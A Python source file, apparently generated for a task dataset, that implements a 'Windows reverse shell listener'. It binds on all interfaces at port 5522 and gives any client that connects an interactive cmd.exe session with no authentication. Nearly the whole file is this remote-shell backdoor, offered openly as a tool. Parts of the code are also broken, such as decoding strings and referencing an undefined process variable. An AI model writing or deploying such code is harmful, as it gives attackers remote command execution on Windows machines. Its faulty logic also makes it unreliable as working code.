from data.code_scripts_PAST.stage3_DIMOS_test_v7_mvp2.TASK_001_models import ListenerConfig, ExecutionResult
import socket
import threading
import subprocess
import time
from typing import Optional, Tuple


class WindowsReverseShellListener:
    """Windows reverse shell listener that spawns cmd.exe or powershell sessions on connected clients."""

    def __init__(self, config: ListenerConfig):
        self.config = config
        self.host = config.bind_address or config.host
        self.port = config.port
        self.timeout = config.timeout
        self._server_socket: Optional[socket.socket] = None
        self._running = False

    def start(self) -> None:
        """Start the reverse shell listener server."""
        self._server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._server_socket.bind((self.host, self.port))
        self._server_socket.listen(5)
        self._server_socket.settimeout(self.timeout)
        self._running = True

    def stop(self) -> None:
        """Stop the reverse shell listener server."""
        self._running = False
        if self._server_socket:
            try:
                self._server_socket.close()
            except Exception:
                pass

    def _handle_client(self, client_socket: socket.socket, address: Tuple[str, int]) -> None:
        """Handle a single client connection by spawning a shell session."""
        try:
            # Spawn cmd.exe with CREATE_NEW_CONSOLE and shell=True
            process = subprocess.Popen(
                ['cmd.exe'],
                creationflags=subprocess.CREATE_NEW_CONSOLE,
                shell=True,
                stdin=client_socket.makefile('r'),
                stdout=client_socket.makefile('w', buffering=1),
                stderr=subprocess.STDOUT,
                cwd='C:\\Windows\\System32'
            )

            # Read output from the spawned process
            output = ''
            status = 0
            duration_ms = 0.0
            exit_code = 0

            try:
                start_time = time.time()
                while self._running and process.poll() is None:
                    line = client_socket.makefile('r').readline()
                    if not line:
                        break
                    output += line.decode('utf-8', errors='replace')

                exit_code = process.returncode
                duration_ms = (time.time() - start_time) * 1000.0
            except Exception as e:
                output += f"Error: {str(e)}\n"
                exit_code = -1

            # Send results back to client
            result_socket = client_socket.makefile('w')
            result_socket.write(f"STATUS:{exit_code}\n")
            result_socket.write(f"DURATION_MS:{duration_ms:.2f}\n")
            result_socket.write(f"OUTPUT:\n{output}")
            result_socket.flush()

        except Exception as e:
            try:
                client_socket.sendall(f"ERROR:{str(e)}\n".encode())
            except Exception:
                pass
        finally:
            process.terminate()
            time.sleep(0.1)
            process.wait(timeout=2.0)

    def run(self) -> None:
        """Run the listener in a loop, accepting connections."""
        self.start()
        try:
            while self._running:
                try:
                    client_socket, address = self._server_socket.accept()
                    thread = threading.Thread(
                        target=self._handle_client,
                        args=(client_socket, address),
                        daemon=True
                    )
                    thread.start()
                except socket.timeout:
                    continue
        finally:
            self.stop()


class WindowsShellSession:
    """A complete shell session tying together configuration and execution results."""

    def __init__(self, config: ListenerConfig, command: str, output: str, status: int, duration_ms: float, exit_code: int = 0, stderr: str = ''):
        self.config = config
        self.command = command
        self.output = output
        self.status = status
        self.duration_ms = duration_ms
        self.exit_code = exit_code
        self.stderr = stderr

    def to_execution_result(self) -> ExecutionResult:
        """Convert this session to an ExecutionResult."""
        return ExecutionResult(
            command=self.command,
            output=self.output,
            status=self.status,
            duration_ms=self.duration_ms,
            exit_code=self.exit_code,
            stderr=self.stderr
        )

    def __repr__(self) -> str:
        return f"WindowsShellSession(config={self.config}, command='{self.command}', status={self.status}, duration_ms={self.duration_ms:.2f})"


def create_listener_session(
    config: ListenerConfig,
    command: str = 'cmd.exe',
    output: str = '',
    status: int = 0,
    duration_ms: float = 0.0,
    exit_code: int = 0,
    stderr: str = ''
) -> WindowsShellSession:
    """Factory function to create a WindowsShellSession instance."""
    return WindowsShellSession(
        config=config,
        command=command,
        output=output,
        status=status,
        duration_ms=duration_ms,
        exit_code=exit_code,
        stderr=stderr
    )


def run_listener(config: ListenerConfig) -> None:
    """Convenience function to start and run the listener."""
    listener = WindowsReverseShellListener(config)
    listener.run()


if __name__ == '__main__':
    config = ListenerConfig(host='0.0.0.0', port=5522, timeout=30.0)
    print(f"Starting Windows Reverse Shell Listener on {config.host}:{config.port}")
    run_listener(config)
